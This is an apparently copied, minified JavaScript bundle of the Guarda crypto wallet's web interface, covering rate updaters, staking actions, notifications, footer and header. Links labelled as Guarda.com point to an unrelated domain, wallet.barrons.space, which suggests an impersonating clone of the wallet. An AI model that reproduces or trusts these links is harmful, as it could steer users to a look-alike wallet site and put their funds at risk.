            O.useEffect)(( () => {
                if (!0 === a)
                    return;
                const e = setInterval(( () => {
                    n.current && n.current()
                }
                ), N_);
                return () => clearInterval(e)
            }
            ), [a]);
            return null
        }
          , TokenRatesUpdater = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(A_)
              , a = (0,
            $.v9)(Bo)
              , n = (0,
            O.useRef)()
              , r = (0,
            O.useCallback)(( (t, a) => {
                0 !== t.length && e((0,
                C_.$j)(t, a))
            }
            ), [e])
              , l = (0,
            O.useCallback)(throttle(Jn()(r, {
                cacheKey: e => {
                    let[t,a] = e;
                    return [JSON.stringify(t), ...a].join()
                }
                ,
                maxAge: 3e4
            }), 300), [r]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && l(...t)
            }
            ), [l, JSON.stringify(t), a]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (n.current = () => r(...t))
            }
            ), [r, JSON.stringify(t), a]);
            (0,
            O.useEffect)(( () => {
                if (!0 === a)
                    return;
                const e = setInterval(( () => {
                    n.current && n.current()
                }
                ), N_);
                return () => clearInterval(e)
            }
            ), [a]);
            return null
        }
          , RatesUpdater = () => O.createElement(O.Fragment, null, O.createElement(CoinRatesUpdater, null), O.createElement(TokenRatesUpdater, null), O.createElement(UsdRatesUpdater, null));
        var x_ = a(20024)
          , I_ = a.n(x_)
          , P_ = a(76702);
        const L_ = I_()((e => {
            (0,
            P_.d)(e);
            ge.b.success(ge.d.DEBUG_WALLET_COUNT_CHANGED, {
                walletCounts: e
            })
        }
        ), 1e3)
          , BackendLoggerUpdater = () => {
            var e;
            const t = (0,
            $.v9)(oe.U)
              , a = (0,
            $.v9)(oe.A0);
            (0,
            O.useEffect)(( () => {
                ge.b.setBackupId(null == a ? void 0 : a.uuid)
            }
            ), [null == a ? void 0 : a.uuid]);
            (0,
            O.useEffect)(( () => {
                ge.b.setEncryptedBackupHash(t)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                var e;
                const t = null == a || null === (e = a.wallets) || void 0 === e ? void 0 : e.length;
                ge.b.setWalletCount(t);
                L_(t)
            }
            ), [null == a || null === (e = a.wallets) || void 0 === e ? void 0 : e.length]);
            return null
        }
          , F_ = "app-settings"
          , W_ = (0,
        te.createAction)("app-settings/successToFetchSettings")()
          , R_ = (0,
        te.createAction)("app-settings/failedToFetchSettings")()
          , fetchSettings = () => async e => {
            try {
                const {data: t} = await U.Ht.get("/api/v1/staking-info/chains");
                e(W_({
                    settings: t
                }))
            } catch (t) {
                ge.b.error(ge.d.FAILED_TO_GET_APP_SETTINGS, {}, t);
                e(R_())
            }
        }
        ;
        function SettingsUpdater() {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Bo);
            (0,
            O.useEffect)(( () => {
                if (!0 === t)
                    return;
                e(fetchSettings());
                const a = window.setInterval(( () => {
                    e(fetchSettings())
                }
                ), 6e4);
                return () => {
                    window.clearInterval(a)
                }
            }
            ), [t]);
            return null
        }
        function NotificationsUpdater() {
            const e = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                e(fetchNotifications());
                const t = window.setInterval(( () => {
                    e(fetchNotifications())
                }
                ), 6e4);
                return () => {
                    window.clearInterval(t)
                }
            }
            ), []);
            return null
        }
        const persistorPersist = () => (e, t, a) => {
            let {persistor: n} = a;
            n.persist()
        }
        ;
        function PersistStarter() {
            const e = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                e(( (e, t, a) => {
                    let {persistor: n} = a;
                    n.persist()
                }
                ))
            }
            ), []);
            return null
        }
        const crossTabStart = () => (e, t, a) => {
            let {crossTabController: n} = a;
            n.start()
        }
        ;
        function CrossTabStarter() {
            const e = (0,
            $.I0)();
            (0,
            O.useEffect)(( () => {
                e(( (e, t, a) => {
                    let {crossTabController: n} = a;
                    n.start()
                }
                ))
            }
            ), []);
            return null
        }
        const B_ = navigator.userAgent
          , O_ = B_.match(/Android/i) || B_.match(/webOS/i) || B_.match(/iPhone/i) || B_.match(/iPad/i) || B_.match(/iPod/i) || B_.match(/BlackBerry/i) || B_.match(/Windows Phone/i)
          , getMobilePlatfotm = () => {
            let e = null
              , t = null;
            if (O_) {
                if (O_.includes("Android")) {
                    e = "Android";
                    t = "https://play.google.com/store/apps/details?id=com.crypto.multiwallet&referrer=utm_source%3Dweb-mobile%26utm_medium%3Dnotification%26utm_campaign%3Ddownload-app"
                }
                if (O_.includes("iPhone") || O_.includes("iPod") || O_.includes("iPad")) {
                    e = "iOS";
                    t = "https://apps.apple.com/app/apple-store/id1442083982"
                }
            }
            return {
                mobilePlatform: e,
                storeLink: t
            }
        }
          , D_ = "@staking"
          , M_ = "staking"
          , U_ = "@staking.SET_CLEAR_STORE_COMMIT.commit"
          , G_ = "@staking.SET_ACTIVE_STAKING"
          , V_ = "@staking.SET_STAKE_INFO_BY_WALLET"
          , K_ = "@staking.FETCH_ACTIVE_STAKING_INFO_BY_WALLET"
          , H_ = "@staking.SET_CURRENT_EPOCH"
          , z_ = "@staking.FETCH_CURRENT_EPOCH"
          , j_ = "@staking.CLAIM_CONFIRM"
          , $_ = "@staking.UNSTAKING_CONFIRM"
          , Z_ = "@staking.STAKING_CONFIRM"
          , Y_ = "@staking.SET_TRANSACTION_HASH.commit"
          , q_ = "@staking.UPDATE_WALLET_BALANCE_BY_UUID"
          , X_ = "@staking.DELEGATE_RESOURCE_CONFIRM"
          , Q_ = "@staking.UNDELEGATE_RESOURCE_CONFIRM"
          , J_ = "@staking.SET_LOADING_START.commit"
          , ew = "@staking.SET_LOADING_STOP.commit"
          , tw = "@staking.SET_PROCESS.commit"
          , aw = "@staking.SET_ERROR_MESSAGE.commit"
          , nw = "STAKING_ADAPTERS_ERROR"
          , rw = "STAKING_APP_ERROR"
          , lw = "@staking.UPDATE_WALLET_BALANCE_SUCCESS"
          , sw = "@staking.UPDATE_WALLET_BALANCE_ERROR"
          , iw = "@staking.UPDATE_STAKE_INFO_BY_WALLET"
          , ow = "@staking.INITIALIZE_STAKE_INFO_UPDATER"
          , cw = "@staking.FETCH_STAKING_VARS"
          , uw = "@staking.SET_STAKING_VARS.commit"
          , dw = "@staking.UPDATE_STAKE_INFO_ONCE"
          , mw = "@staking.START_ONCE_STAKE_INFO_UPDATE.commit"
          , pw = "@staking.FINISH_ONCE_STAKE_INFO_UPDATE.commit"
          , fw = "@staking.SET_IS_ONE_TIME_FETCH_START.commit"
          , Ew = "@staking.SET_IS_ONE_TIME_FETCH_END.commit"
          , hw = "@staking.ONE_TIME_STAKE_INFO_UPDATE";
        var gw = a(57307);
        const createDispatchHook = () => e => {
            const t = (0,
            $.I0)();
            return (0,
            O.useCallback)((function() {
                return t(e(...arguments))
            }
            ), [t, e])
        }
        ;
        let yw, vw, _w, ww, bw;
        !function(e) {
            e.pending = "pending";
            e.succeeded = "succeeded";
            e.failed = "failed";
            e.cancelled = "cancelled"
        }(yw || (yw = {}));
        !function(e) {
            e.visited = "visited";
            e.exited = "exited"
        }(vw || (vw = {}));
        !function(e) {
            e.warned = "warned";
            e.succeeded = "succeeded";
            e.failed = "failed"
        }(_w || (_w = {}));
        !function(e) {
            e.error = "error";
            e.warning = "warning";
            e.info = "info"
        }(ww || (ww = {}));
        !function(e) {
            e.clo = "clo";
            e.ada = "ada"
        }(bw || (bw = {}));
        const createRequestActions = e => {
            const t = e
              , a = `${e}/${yw.pending}`
              , n = `${e}/${yw.succeeded}`
              , r = `${e}/${yw.failed}`
              , l = `${e}/${yw.cancelled}`;
            return {
                BASE: t,
                STARTED: a,
                SUCCEEDED: n,
                ERRORED: r,
                CANCELLED: l,
                start: (0,
                gw.PH)(a, ( (e, t) => ({
                    meta: e,
                    payload: t
                }))),
                success: (0,
                gw.PH)(n, ( (e, t) => ({
                    payload: e,
                    meta: t
                }))),
                error: (0,
                gw.PH)(r, ( (e, t) => ({
                    error: !0,
                    payload: e,
                    meta: t
                }))),
                cancel: (0,
                gw.PH)(l, ( (e, t) => ({
                    meta: e,
                    payload: t
                })))
            }
        }
        ;
        function *requestSaga(e, t) {
            const {start: a, success: n, error: r, cancel: l} = e;
            for (var s = arguments.length, i = new Array(s > 2 ? s - 2 : 0), o = 2; o < s; o++)
                i[o - 2] = arguments[o];
            const c = i[0];
            yield*(0,
            Of.gz)(a(c));
            try {
                const e = yield*(0,
                Of.RE)(t, ...i);
                yield*(0,
                Of.gz)(n(e, c));
                return e
            } catch (e) {
                console.debug(e);
                return yield*(0,
                Of.gz)(r(e, c))
            } finally {
                (yield*(0,
                Of.By)()) && (yield*(0,
                Of.gz)(l(c)))
            }
        }
        function *request(e, t, a) {
            return yield*(0,
            Of.rM)(requestSaga, e, t, a)
        }
        function createLifeCycleActions(e) {
            const t = e
              , a = `${e}/${vw.visited}`
              , n = `${e}/${vw.exited}`;
            return {
                BASE: t,
                VISITED: a,
                EXITED: n,
                visit: (0,
                gw.PH)(a, ( (e, t) => ({
                    meta: e,
                    payload: t
                }))),
                exit: (0,
                gw.PH)(n, ( (e, t) => ({
                    meta: e,
                    payload: t
                })))
            }
        }
        function *lifeCycleSaga(e, t, a) {
            const {VISITED: n, EXITED: r} = e;
            for (; yield*(0,
            Of.qn)(n); ) {
                const e = yield*(0,
                Of.Fm)(t, a);
                yield*(0,
                Of.qn)(r);
                yield*(0,
                Of.al)(e)
            }
        }
        const createLifeCycleDispatchHook = e => (t, a) => {
            const n = useDispatch()
              , {visit: r, exit: l} = e;
            batch(( () => {
                n(r(a));
                n(t(a))
            }
            ));
            return () => {
                n(l(a))
            }
        }
        ;
        var kw = a(89974)
          , Sw = a(57393);
        const getTypeFromErrorContext = (e, t) => e && e[t] && e[t].type
          , requestErrorToNotification = e => ({
            type: ww.error,
            message: `${e}`,
            conditional: "request"
        })
          , requestInfoToNotification = e => ({
            type: ww.info,
            message: `${e}`,
            conditional: "request"
        })
          , constructNotification = e => {
            let {contexts: t, property: a} = e;
            return e => {
                let[n,r] = e;
                const l = getTypeFromErrorContext(t, n);
                return l ? {
                    type: l,
                    message: r,
                    conditional: n,
                    property: a
                } : {
                    message: r,
                    conditional: n,
                    property: a
                }
            }
        }
          , composeWithType = e => Array.isArray(e) ? e.flatMap((e => Object.entries(e.constraints || {}).map(constructNotification(e)))) : e
          , createValidateActions = e => {
            const t = e
              , a = `${e}/${_w.succeeded}`
              , n = `${e}/${_w.failed}`;
            return {
                BASE: t,
                SUCCEEDED: a,
                FAILED: n,
                success: (0,
                gw.PH)(a, (e => ({
                    payload: e
                }))),
                fail: (0,
                gw.PH)(n, (e => ({
                    payload: e
                })))
            }
        }
        ;
        function *validateSaga(e, t, a) {
            const n = (0,
            kw.d8)(t, a);
            try {
                yield*(0,
                Of.RE)(Sw.tff, null == t ? void 0 : t.name, n);
                yield*(0,
                Of.gz)(e.success());
                return null
            } catch (t) {
                const a = composeWithType(t);
                yield*(0,
                Of.gz)(e.fail(a));
                return a
            }
        }
        const Cw = "clo"
          , Nw = createDispatchHook()
          , Tw = "staking/clo/set_process"
          , Aw = (0,
        gw.PH)(Tw, (e => ({
            payload: e
        })))
          , xw = "staking/clo/update_balance"
          , Iw = (0,
        gw.PH)(xw, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , Pw = "staking_module"
          , Lw = "staking/staking_module/clo"
          , Fw = (0,
        gw.PH)(Lw, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , Ww = createLifeCycleActions(Lw)
          , Rw = `${Lw}/get`
          , Bw = (0,
        gw.PH)(Rw, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , Ow = createRequestActions(Rw)
          , Dw = undefined
          , Mw = `${`${Lw}/reward`}/validate`
          , Uw = (0,
        gw.PH)(Mw, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , Gw = createValidateActions(Mw)
          , Vw = "claim"
          , Kw = `${Lw}/claim`
          , Hw = (0,
        gw.PH)(Kw, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , zw = createRequestActions(Kw)
          , jw = "withdraw"
          , $w = `${Lw}/withdraw`
          , Zw = (0,
        gw.PH)($w, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , Yw = createRequestActions($w)
          , qw = "staking_page"
          , Xw = "staking/staking_page/clo"
          , Qw = createLifeCycleActions(Xw)
          , Jw = `${Xw}/get`
          , eb = (0,
        gw.PH)(Jw, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , tb = createRequestActions(Jw)
          , ab = `${Xw}/send`
          , nb = (0,
        gw.PH)(ab, ( (e, t) => ({
            meta: e,
            payload: t
        })))
          , rb = createRequestActions(ab)
          , lb = {
            setClearStore: (0,
            te.createAction)(U_)(),
            setActiveStaking: (0,
            te.createAction)(G_)(),
            fetchActiveStakingInfoByWallet: (0,
            te.createAction)(K_)(),
            setStakeInfoByWallet: (0,
            te.createAction)(V_)(),
            setCurrentEpoch: (0,
            te.createAction)(H_)(),
            fetchCurrentEpoch: (0,
            te.createAction)(z_)(),
            claimConfirm: (0,
            te.createAction)(j_)(),
            unstakeConfirm: (0,
            te.createAction)($_)(),
            stakeConfirm: (0,
            te.createAction)(Z_)(),
            setTransactionHash: (0,
            te.createAction)(Y_)(),
            updateWalletBalanceByUuid: (0,
            te.createAction)(q_)(),
            delegateResourceConfirm: (0,
            te.createAction)(X_)(),
            undelegateResourceConfirm: (0,
            te.createAction)(Q_)(),
            setLoadingStart: (0,
            te.createAction)(J_)(),
            setLoadingStop: (0,
            te.createAction)(ew)(),
            setProcessCommit: (0,
            te.createAction)(tw)(),
            setErrorMessage: (0,
            te.createAction)(aw)(),
            updateStakeInfoByWallet: (0,
            te.createAction)(iw)(),
            initializeStakingInfoUpdater: (0,
            te.createAction)(ow)(),
            fetchStakingVars: (0,
            te.createAction)(cw)(),
            setStakingVars: (0,
            te.createAction)(uw)(),
            updateStakeInfoOnce: (0,
            te.createAction)(dw)(),
            startOnceStakingInfoUpdate: (0,
            te.createAction)(mw)(),
            finishOnceStakingInfoUpdate: (0,
            te.createAction)(pw)(),
            setIsOneTimeFetchStart: (0,
            te.createAction)(fw)(),
            setIsOneTimeFetchEnd: (0,
            te.createAction)(Ew)(),
            oneTimeStakeInfoUpdate: (0,
            te.createAction)(hw)()
        };
        class ErrorBoundary extends O.Component {
            static getDerivedStateFromError(e) {
                return {
                    error: e
                }
            }
            componentDidCatch(e, t) {
                const {isSend: a} = this.props;
                !1 !== a && ge.b.error(ge.d.UI_ERROR, e, {
                    stack: t.componentStack,
                    browser: navigator.userAgent
                })
            }
            render() {
                const {children: e} = this.props;
                return e
            }
        }
        const sb = ErrorBoundary
          , ib = (0,
        te.createAction)("redux-persist-error/consumeReduxPersistError")()
          , reduxPersistErrorStateSelector = e => e["redux-persist-error"]
          , ob = (0,
        _t.P1)(reduxPersistErrorStateSelector, (e => {
            let {error: t} = e;
            return t
        }
        ))
          , cb = (0,
        _t.P1)(reduxPersistErrorStateSelector, (e => {
            let {isIndexedDbReadonly: t} = e;
            return t
        }
        ))
          , ReduxPersistErrorThrower = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(ob)
              , [a,n] = (0,
            O.useState)();
            (0,
            O.useEffect)(( () => {
                if (t) {
                    e(ib());
                    n(( () => {
                        throw t
                    }
                    ))
                }
            }
            ), [e, t]);
            return null
        }
          , ub = "visa-mastercard_wrapper_14kuT"
          , db = "visa-mastercard_withBorder_3bhuq"
          , mb = "visa-mastercard_iconLeft_3VSQy"
          , pb = "visa-mastercard_iconCenter_2nw4X"
          , fb = "visa-mastercard_iconRight_27uwx"
          , Eb = "visa-mastercard_appleIcon_1zMnp"
          , hb = a.p + "e21bd8188ed067f684ddee65df9b7458.svg"
          , gb = a.p + "865409732b1e8991a54a7f7ae0d2c865.svg"
          , yb = a.p + "a54b7837a709413074851601c6ac8862.svg"
          , vb = a.p + "c7382fb9404cfe670e55094594be8538.svg"
          , _b = a.p + "f58e75a9a0d1646561e90457d5afd2df.svg"
          , wb = a.p + "6f2ba1fbb74486cb8f9b1ecc4441a6ef.svg"
          , bb = a.p + "e59be1025b890b910f7f7cfe95065f78.svg"
          , kb = undefined
          , visa_mastercard = e => {
            const t = (0,
            $.v9)(Ot)
              , {isNew: a, withBorder: n, withApple: r, withSepa: l, withUnionPay: s, withVisa: i=!0, withMasterCard: o=!0} = e;
            return a ? O.createElement("div", {
                className: ub
            }, i && O.createElement("img", {
                alt: "",
                src: "dark" === t ? vb : yb,
                className: Ht()(mb, {
                    [db]: n
                })
            }), o && O.createElement("img", {
                alt: "",
                src: _b,
                className: Ht()(pb, {
                    [db]: n
                })
            }), r && O.createElement("div", {
                className: Ht()(fb, {
                    [db]: n
                }, Eb)
            }), l && O.createElement("img", {
                alt: "",
                src: wb,
                className: Ht()(fb, {
                    [db]: n
                })
            }), s && O.createElement("img", {
                alt: "",
                src: bb,
                className: Ht()(fb, {
                    [db]: n
                })
            })) : O.createElement("img", {
                alt: "",
                src: "dark" === t ? gb : hb
            })
        }
        ;
        var Sb = a(70476)
          , Cb = a.n(Sb);
        const Nb = a.p + "assets/images/1oHJyGR.png"
          , Tb = a.p + "assets/images/1A3r3j5.png"
          , Ab = "footer_background_2BzYH"
          , xb = "footer_footerWrapper_KUA3R"
          , Ib = "footer_wrapper_3QL8Z"
          , Pb = "footer_footerMenu_39m1F"
          , Lb = "footer_storeIconsWrapper_1Ik6f"
          , Fb = "footer_ending_2JmUn"
          , Wb = "footer_storeIcon_1kJsi"
          , Rb = "footer_separator_8Sc0R"
          , Bb = "footer_info_16mn0"
          , Ob = "footer_copyright_1aTmK"
          , Db = "footer_iconHome_Zb6Z5"
          , Mb = "footer_homeLink_1x0jA"
          , Ub = "footer_mobileVersionContainer_2MqMo"
          , Gb = "https://play.google.com/store/apps/details?id=com.crypto.multiwallet&referrer=utm_source%3Dlanding%26utm_campaign%3Dlp_footer%26anid%3Dadmob"
          , Vb = "https://itunes.apple.com/app/apple-store/id1442083982?pt=118900606&ct=lp_footer&mt=8"
          , Kb = "https://wallet.barrons.space/"
          , Hb = "https://support.guarda.com"
          , zb = "https://wallet.barrons.space/coins/"
          , jb = "https://wallet.barrons.space/privacy-policy"
          , $b = "https://wallet.barrons.space/terms-of-service"
          , Footer_Footer = () => (0,
        M.d)() ? null : O.createElement("div", {
            className: xb
        }, O.createElement("div", {
            className: Ab
        }, O.createElement("div", {
            className: "container"
        }, O.createElement("div", {
            className: Ib
        }, O.createElement("nav", {
            className: Pb
        }, O.createElement("a", {
            href: Kb,
            className: Mb
        }, O.createElement("span", {
            dangerouslySetInnerHTML: {
                __html: Cb()
            },
            className: Db
        }), "Back to Guarda.com"), O.createElement("a", {
            href: Hb,
            rel: "noopener noreferrer",
            target: "_blank"
        }, "Support"), O.createElement("a", {
            href: zb,
            target: "_blank",
            rel: "noreferrer noopener"
        }, "Coin Status"), O.createElement("a", {
            href: jb,
            target: "_blank",
            rel: "noreferrer noopener"
        }, "Privacy Policy"), O.createElement("a", {
            href: $b,
            target: "_blank",
            rel: "noreferrer noopener"
        }, "Terms of Service")), O.createElement("div", {
            className: Lb
        }, O.createElement("a", {
            href: Gb,
            target: "_blank",
            rel: "noopener noreferrer"
        }, O.createElement("img", {
            alt: "",
            className: Wb,
            src: Nb
        })), O.createElement("a", {
            href: Vb,
            target: "_blank",
            rel: "noopener noreferrer"
        }, O.createElement("img", {
            alt: "",
            className: Wb,
            src: Tb
        }))), O.createElement("div", {
            className: Lb
        }, O.createElement(visa_mastercard, null))), O.createElement("div", {
            className: Rb
        }), O.createElement("div", {
            className: Ht()("row", Fb)
        }, O.createElement("div", {
            className: "col-xs-11"
        }, O.createElement("div", {
            className: Ob
        }, "© 2017-", (new Date).getFullYear(), " Guarda. All rights reserved"), O.createElement("br", null)), O.createElement("div", {
            className: "col-xs-11"
        }, O.createElement("div", {
            className: Bb
        }, "GUARDACO LDA, provides virtual currency wallet service and services related to it, Legal entity ID - 516458965, whose registered office is Portugal, 1050-134 Lisboa, Rua Latino Coelho, str. 87."), O.createElement("br", null), O.createElement("div", {
            className: Bb
        }, "GUARDARIAN OÜ, a private limited company incorporated in Estonia with company number 14320990, whose registered office address is Rotermanni tn 2, Tallinn 10111, Estonia (“Guardarian”). Guardarian has obtained the license to provide virtual currency services which is issued by the respective Estonian authority. License’s number is FVT000200. Guardarian provides the virtual currency against virtual or fiat currency exchange service and card related products. Prepaid Card VISA is issued by Walletto UAB.")))), O_ && O.createElement("div", {
            className: Ub
        }, O.createElement("div", {
            className: "container"
        }, O.createElement("a", {
            href: "/app?fullWebVersion=0",
            className: "col-xs-12"
        }, "Switch to mobile")))))
          , Zb = "slot_notificationSlot__1FoD"
          , Yb = "NotificationSlot"
          , NotificationSlot = () => O.createElement("div", {
            className: Zb
        }, O.createElement(q.g7, {
            name: Yb
        }))
          , qb = (0,
        te.createAction)("@cookie/SET_COOKIE_STATUS")()
          , Xb = "cookie-status"
          , Qb = ["status"]
          , Jb = {
            status: !1
        }
          , ek = (0,
        te.createReducer)(Jb).handleAction(qb, ( (e, t) => {
            let {payload: {status: a}} = t;
            return {
                ...e,
                status: a
            }
        }
        ))
          , cookieStatusStateSelector = e => e[Xb]
          , tk = (0,
        _t.P1)(cookieStatusStateSelector, (e => {
            let {status: t} = e;
            return t
        }
        ))
          , acceptCookie = () => qb({
            status: !0
        })
          , ak = {
            notification: "notification_notification_6RnZU",
            infoNotification: "notification_infoNotification_3AD09",
            warningNotification: "notification_warningNotification_2OIGP",
            notificationContent: "notification_notificationContent_2BDfs"
        }
          , Notification = e => {
            let {className: t, contentClassName: a, variant: n="info", children: r} = e;
            return O.createElement(q.de, {
                name: Yb
            }, O.createElement("div", {
                className: Ht()(ak.notification, {
                    [ak.infoNotification]: "info" === n,
                    [ak.warningNotification]: "warning" === n
                }, t)
            }, O.createElement("div", {
                className: Ht()(ak.notificationContent, {
                    [ak.infoNotificationContent]: "info" === n,
                    [ak.warningNotificationContent]: "warning" === n
                }, a)
            }, r)))
        }
          , nk = {
            buttons: "cookie-notification_buttons_cx3xb",
            link: "cookie-notification_link_ZNa-b",
            mobileMode: "cookie-notification_mobileMode_2lud5",
            mobileWrapper: "cookie-notification_mobileWrapper_1aIGs",
            mobileContainer: "cookie-notification_mobileContainer_31Yii",
            mobileButton: "cookie-notification_mobileButton_3FREe"
        }
          , CookieNotification = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(tk);
            if (!(0,
            M.U_)() || t)
                return null;
            const handleAccept = () => e(acceptCookie());
            return O.createElement(Notification, null, O.createElement("div", {
                className: Ht()(nk.text, O_ && nk.mobileMode)
            }, "Our website uses cookies to improve your experience. By continuing you agree to our ", O.createElement("a", {
                className: nk.link,
                target: "_blank",
                rel: "noopener noreferrer",
                href: "https://wallet.barrons.space/privacy-policy"
            }, "Privacy Policy"), "."), O.createElement("div", {
                className: Ht()(nk.buttons, O_ && nk.mobileMode, O_ && nk.mobileButton)
            }, O.createElement(Yl, {
                color: "blue",
                onClick: handleAccept
            }, "Ok")))
        }
          , rk = "new-version-notification_notificationMessage_HmQEt"
          , NewVersionNotification = () => {
            const e = (0,
            $.v9)(oe.kI)
              , t = (0,
            $.I0)()
              , [a,n] = (0,
            O.useState)(!1);
            (0,
            O.useEffect)(( () => {
                if (!(0,
                M.d)())
                    return;
                if (void 0 === window.guardaElectronApi)
                    return;
                const e = undefined;
                return window.guardaElectronApi.subscribe("update-downloaded", ( () => {
                    n(!0)
                }
                ))
            }
            ), []);
            const r = (0,
            $.v9)(selectedNewVersionAvailableNotify)
              , handleAcceptNewGuardaAppVersion = () => {
                const e = new URL(window.location.href);
                e.searchParams.set("random", (0,
                he.Z)());
                window.history.pushState("", "", e.toString());
                window.location.reload()
            }
              , handleAcceptNewGuardaElectronVersion = () => {
                if (e === oe.PZ.LOGGED_OUT_HAS_NO_BACKUP) {
                    window.guardaElectronApi.send("update-accepted");
                    return
                }
                t(handleDownload(Sm.FORCE));
                const a = window.guardaElectronApi.subscribe("done-download", ( (e, t) => {
                    let {state: n} = t;
                    a();
                    "completed" === n && window.guardaElectronApi.send("update-accepted")
                }
                ))
            }
            ;
            return a || r ? O.createElement(Notification, {
                variant: "info"
            }, O.createElement("span", {
                className: rk
            }, "New update is available!"), a ? O.createElement(Yl, {
                color: "blue",
                onClick: handleAcceptNewGuardaElectronVersion
            }, e === oe.PZ.LOGGED_OUT_HAS_NO_BACKUP ? O.createElement(O.Fragment, null, "Update") : O.createElement(O.Fragment, null, "Download backup and update")) : O.createElement(Yl, {
                color: "blue",
                onClick: handleAcceptNewGuardaAppVersion
            }, (0,
            M.d)() ? O.createElement(O.Fragment, null, "Restart the app") : O.createElement(O.Fragment, null, "Reload page"))) : null
        }
        ;
        var lk = a(42238)
          , sk = a.n(lk);
        const ik = a.p + "ddef650e6771a19454f4b29014cef532.svg"
          , ok = "indexeddb-readonly-notification_notificationWrapper_1LPRL"
          , ck = "indexeddb-readonly-notification_notificationMessage_2yGpD"
          , uk = "indexeddb-readonly-notification_warningSignIcon_3J6gN"
          , dk = new (sk())
          , {name: mk} = dk.getBrowser()
          , IndexeddbReadonlyNotification = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(cb)
              , a = (0,
            $.v9)(oe.kI)
              , n = a === oe.PZ.LOGGED_OUT_HAS_BACKUP || a === oe.PZ.LOGGED_IN
              , handleDownloadButtonClick = () => {
                e(handleDownload(Sm.FORCE))
            }
            ;
            return t ? O.createElement(Notification, {
                variant: "warning"
            }, O.createElement("div", {
                className: ok
            }, O.createElement("div", {
                className: uk
            }), O.createElement("div", {
                className: ck
            }, O.createElement("div", null, mk, " may remove all wallet data if you reload this private tab.", " ", O.createElement("a", {
                target: "_blank",
                rel: "noopener noreferrer",
                href: "https://support.guarda.com/troubleshooting/how-to-use-guarda-wallet-with-firefox-private-pages"
            }, "Read more", " ", O.createElement("img", {
                src: ik
            }))), O.createElement("div", null, "Download a backup every time you make changes to avoid losing funds.")), n && O.createElement(Yl, {
                color: "orange",
                onClick: handleDownloadButtonClick
            }, "Download backup"))) : null
        }
          , Notifications = () => O.createElement(O.Fragment, null, O.createElement(CookieNotification, null), O.createElement(NewVersionNotification, null), O.createElement(IndexeddbReadonlyNotification, null))
          , pk = "header_background_2lnWj"
          , fk = "header_wrapper_XpKS1"
          , Ek = "header_logotype_2sLZl"
          , hk = "header_menuTitles_pqz4l"
          , gk = "header_menuRight_1UJ1w"
          , yk = "header_menuApp_30F2C"
          , vk = "header_item_1lIOM"
          , _k = "header_backToGuarda_18ad4"
          , wk = "header_iconHome_3kTzE"
          , bk = "header_active_2W2mi"
          , kk = "header_iconMenu_1Ybai"
          , Sk = "header_iconNotify_3A4Ve"
          , Ck = "header_newTab_36_K0"
          , Nk = "header_iconMenuChat_1hB6W"
          , Tk = "header_iconHistory_31rm-"
          , Ak = "header_iconMenuFaq_ZlgHa"
          , xk = "header_iconLogout_3GZfP"
          , Ik = "header_iconMoon_1CTHF"
          , Pk = "header_faqWrap_1y89w"
          , Lk = "header_newLabel_16-CH"
          , Fk = a.p + "fec62772689d43733f0f995782559d5d.svg";
        var Wk = a(13858)
          , Rk = a.n(Wk)
          , Bk = a(88494)
          , Ok = a.n(Bk)
          , Dk = a(56589)
          , Mk = a.n(Dk)
          , Uk = a(55655)
          , Gk = a.n(Uk)
          , Vk = a(18933)
          , Kk = a.n(Vk);
        const Hk = Boolean(M.CM && "1" === (0,
        bu.ZP)("epilepsy-mode"))
          , ThemeButton = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(Ot)
              , toggleTheme = () => {
                e(Ct("dark" === t ? {
                    theme: Nt.light
                } : {
                    theme: Nt.dark
                }))
            }
            ;
            (0,
            O.useEffect)(( () => {
                if (!Hk)
                    return;
                const e = window.setTimeout(( () => {
                    toggleTheme()
                }
                ), 3e3);
                return () => {
                    window.clearTimeout(e)
                }
            }
            ), [t]);
            return O.createElement("div", {
                id: "dark" === t ? "SETTINGS_NIGHT_MODE_OFF" : "SETTINGS_NIGHT_MODE_ON",
                dangerouslySetInnerHTML: {
                    __html: "dark" === t ? Gk() : Kk()
                },
                onClick: toggleTheme,
                className: Ik
            })
        }
          , zk = ThemeButton
          , jk = undefined
          , link_internal = e => {
            const isActiveRootLink = e => {
                const {pathname: t} = location;
                return t.includes(e)
            }
            ;
            return O.createElement(O.Fragment, null, !e.rootURL && O.createElement(Y.OL, {
                id: "buyOpen",
                to: e.to,
                activeClassName: bk,
                className: Ht()(e.className, hk)
            }, e.icon && O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: e.icon
                },
                className: kk
            }), e.children), e.rootURL && O.createElement(Y.OL, {
                id: "buyOpen",
                to: e.to,
                className: Ht()(e.className, {
                    [bk]: isActiveRootLink(e.rootURL)
                }, hk)
            }, e.icon && O.createElement("div", {
                dangerouslySetInnerHTML: {
                    __html: e.icon
                },
                className: kk
            }), e.children))
        }
        ;
        var $k = a(85380)
          , Zk = a.n($k);
        const back_to_guarda = () => O.createElement("a", {
            href: "https://wallet.barrons.space/",
            className: _k
        }, O.createElement("div", {
            dangerouslySetInnerHTML: {
                __html: Zk()
            },
            className: wk
        }), "Back to Guarda.com");
        function HeaderWallets() {
            const e = (0,
            $.I0)()
              , t = (0,
            j.TH)()
              , isActiveRootLink = () => {
                const {pathname: e} = t;
                return !(e.includes("backup") || e.includes("borrow") || e.includes("buy") || e.includes("settings") || e.includes("private-keys") || e.includes("earn") || e.includes("exchange") || e.includes("supported-currencies") || e.includes("history"))
            }
              , isActiveImportRestore = () => {
                const {pathname: e} = t;
                return e.includes("app/import") || e.includes("app/restore") || e.includes("app/recovery-mnemonic")
            }
            ;
            function handleBorrowClick() {
                cc.$.send(cc.d.BORROW_OPEN)
            }
